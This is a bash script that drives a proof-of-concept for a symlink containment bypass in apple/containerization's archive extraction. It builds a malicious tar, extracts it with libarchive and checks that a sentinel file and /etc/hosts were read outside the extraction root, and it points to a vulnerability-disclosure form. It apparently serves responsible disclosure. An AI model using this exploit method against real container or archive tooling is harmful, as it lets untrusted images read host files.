#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════
# RUN_POC.sh — apple/containerization Symlink Containment Bypass
# CWE-61 / ArchiveReader.extractEntry() lines 369–382
# Commit: 2ec221af5af45c156688bba323cc733f9f49c840 (2026-08-06)
# ═══════════════════════════════════════════════════════════════════════════

set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
L1_PASS=0; L1_FAIL=0

section() { printf "\n%s\n  %s\n%s\n" "$(printf '═%.0s' {1..67})" "$*" "$(printf '═%.0s' {1..67})"; }

section "LAYER 1 — real libarchive (Ubuntu / Linux)"
echo "  Proves: symlinkat() accepts absolute escaping target"
echo "          open() reads sentinel and /etc/hosts via symlink"
echo "  Uses:   same C API as ContainerizationArchive CArchive bridge"
echo ""

LIBARCHIVE=""
for c in /usr/lib/x86_64-linux-gnu/libarchive.so.13 \
         /usr/lib/aarch64-linux-gnu/libarchive.so.13 \
         /usr/local/lib/libarchive.dylib \
         /opt/homebrew/lib/libarchive.dylib; do
  [ -f "$c" ] && { LIBARCHIVE="$c"; break; }
done

if [ -z "$LIBARCHIVE" ]; then
    echo "  ❌  libarchive not found."
    echo "      Ubuntu: apt install libarchive13 / macOS: brew install libarchive"
    L1_FAIL=$((L1_FAIL+1))
else
    echo "  libarchive: $LIBARCHIVE"

    # Compile
    if gcc -I"$SCRIPT_DIR" \
           -o "$SCRIPT_DIR/poc_real" \
           "$SCRIPT_DIR/poc_real.c" \
           "$LIBARCHIVE" \
           -Wl,-rpath,"$(dirname "$LIBARCHIVE")" 2>/tmp/gcc_err.txt; then
        echo "  ✅  Compiled poc_real"
        L1_PASS=$((L1_PASS+1))
    else
        echo "  ❌  Compilation failed:"; cat /tmp/gcc_err.txt
        L1_FAIL=$((L1_FAIL+1))
    fi

    # Build malicious tar
    if python3 "$SCRIPT_DIR/create_malicious_tar.py" \
          --target /tmp/poc_outside_root/secret.txt \
          --output "$SCRIPT_DIR/malicious_oci.tar" > /dev/null 2>&1; then
        echo "  ✅  Malicious tar built (target: /tmp/poc_outside_root/secret.txt)"
        L1_PASS=$((L1_PASS+1))
    else
        echo "  ❌  create_malicious_tar.py failed"
        L1_FAIL=$((L1_FAIL+1))
    fi

    # Run
    EXTRACT_DIR="$(mktemp -d /tmp/poc_extract_XXXXXX)"
    if "$SCRIPT_DIR/poc_real" \
           "$SCRIPT_DIR/malicious_oci.tar" \
           "$EXTRACT_DIR" > /tmp/poc_l1_out.txt 2>&1; then
        echo "  ✅  poc_real exit 0"
        L1_PASS=$((L1_PASS+1))

        if grep -q "\[PASS\]" /tmp/poc_l1_out.txt; then
            echo "  ✅  [PASS] confirmed in output"
            L1_PASS=$((L1_PASS+1))
        else
            echo "  ❌  [PASS] not found"; cat /tmp/poc_l1_out.txt
            L1_FAIL=$((L1_FAIL+1))
        fi

        if grep -q "HOST_SECRET_READ_VIA_SYMLINK_CONTAINMENT_BYPASS" /tmp/poc_l1_out.txt; then
            echo "  ✅  Sentinel content read from HOST confirmed"
            L1_PASS=$((L1_PASS+1))
        else
            echo "  ❌  Sentinel content not found in output"
            L1_FAIL=$((L1_FAIL+1))
        fi
    else
        echo "  ❌  poc_real exited non-zero:"
        cat /tmp/poc_l1_out.txt
        L1_FAIL=$((L1_FAIL+1))
    fi
    rm -rf "$EXTRACT_DIR"
fi

section "LAYER 2 — real ArchiveReader + LocalContent + LocalContentStore"
echo "  Requires: fork of apple/containerization with Package.swift.patch applied."
echo "  Files:    swift_poc/SymlinkContainmentBypassTests.swift"
echo "            github_actions/poc_workflow.yml"
echo "            github_actions/Package.swift.patch"
echo ""

SWIFT="$(command -v swift 2>/dev/null || true)"
if [ -n "$SWIFT" ]; then
    echo "  Swift found: $($SWIFT --version 2>&1 | head -1)"
    echo "  ⚠️   Layer 2 must run inside a fork of apple/containerization."
    echo ""
fi

echo "  Option A — GitHub Actions (recommended):"
echo "    1. Fork apple/containerization on GitHub"
echo "    2. git checkout 2ec221af"
echo "    3. patch -p1 < github_actions/Package.swift.patch"
echo "    4. cp swift_poc/SymlinkContainmentBypassTests.swift \\"
echo "          Tests/ContainerizationArchiveTests/"
echo "    5. cp github_actions/poc_workflow.yml .github/workflows/"
echo "    6. Push → Actions → 'PoC — Symlink Containment Bypass' → Run workflow"
echo ""
echo "  Option B — local macOS:"
echo "    git clone https://github.com/YOUR_FORK/containerization && cd containerization"
echo "    git checkout 2ec221af"
echo "    patch -p1 < ../github_actions/Package.swift.patch"
echo "    cp ../swift_poc/SymlinkContainmentBypassTests.swift \\"
echo "          Tests/ContainerizationArchiveTests/"
echo "    swift test --filter symlinkContainmentBypass --verbose"
echo ""
echo "  Expected output (all must appear):"
echo "    [PASS] SymlinkContainmentBypass — real apple/containerization"
echo "    Phase 2 — LocalContent.data()"
echo "      sentinel read: HOST_SECRET_READ_VIA_SYMLINK_CONTAINMENT_BYPASS"
echo "      /etc/hosts read ... localhost ..."
echo "    Phase 3 — LocalContentStore.get().data()"
echo "      sentinel via store: HOST_SECRET_READ_VIA_SYMLINK_CONTAINMENT_BYPASS"
echo "      /etc/hosts via store: YES"
echo "    Phase 4 — ArchiveWriter control"
echo "      escaping symlinks excluded by writer: YES"

section "RESULT"
echo "  Layer 1: $L1_PASS checks passed, $L1_FAIL failed"
echo ""
if [ "$L1_FAIL" -eq 0 ]; then
    echo "  ✅  LAYER 1 PASS — symlink containment bypass on real libarchive."
    echo "      Production Score: 3/5"
    echo "      Run Layer 2 (GitHub Actions macOS-15) → Score 4/5"
    echo "      macOS 26 confirmation → Score 5/5"
    echo ""
    echo "  Submit: https://github.com/apple/containerization/security/advisories/new"
else
    echo "  ❌  Layer 1: $L1_FAIL failure(s). See output above."
    exit 1
fi
